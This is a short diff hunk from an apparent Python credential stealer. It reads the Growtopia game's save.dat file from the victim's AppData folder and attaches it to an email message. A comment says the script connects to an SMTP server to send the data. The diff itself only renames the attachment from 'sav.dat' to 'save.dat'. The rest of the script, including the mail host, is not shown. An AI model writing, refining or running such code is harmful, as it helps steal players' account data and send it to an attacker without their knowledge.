@@ -99,7 +99,7 @@ with open(path + '\AppData\Local\Growtopia\save.dat', 'rb') as f:
     file_data = f.read()
     
 
-msg.add_attachment(file_data, maintype='dat', subtype='dat', filename='sav.dat')
+msg.add_attachment(file_data, maintype='dat', subtype='dat', filename='save.dat')
 
 
 #Note this one will connect to smtp server to send data, do not modify
